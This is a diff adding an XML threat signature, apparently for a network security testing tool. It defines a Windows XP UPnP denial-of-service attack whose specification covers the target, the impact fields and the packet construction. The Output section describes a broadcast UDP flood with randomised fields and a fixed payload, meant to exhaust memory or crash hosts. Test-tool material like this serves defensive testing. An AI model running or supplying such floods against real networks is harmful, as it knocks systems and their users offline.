@@ -1,0 +1,73 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Universal Plug and Play Denial of Service"/>
+    <EngDesc display="true" value="This threat sends multiple UDP packets at the Universal Plug and Play service (UPnP), which can cause the target to use up all available memory or crash.  When used with special payload, it can cause a remote exploit.  The threat targets the broadcast address 255.255.255.255 / FF:FF:FF:FF:FF:FF which attempts to maximize the potential damage."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Corruption"/>
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+      <item value="Flood"/>
+    </Intent>
+    <Protocol display="true" value="UPnP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Host"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Windows"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Windows_XP"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.eeye.com/html/research/advisories/AD20011220.html"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000000ff4651203300a900fe009b00c9363ca7d7"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742243482968750"/>
+    <SigStyle display="false" value="Flood"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="5"/>
+    <Regex display="false" value="\X58\X50\X0a\X0d"/>
+    <Created value="1139461857" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="FF:FF:FF:FF:FF:FF" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="0" TTL="@random(10,50)" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="255.255.255.255" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="@random(1025,65535)" destPort="$destPort" checksum="" length="" Payload="58500a0d"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
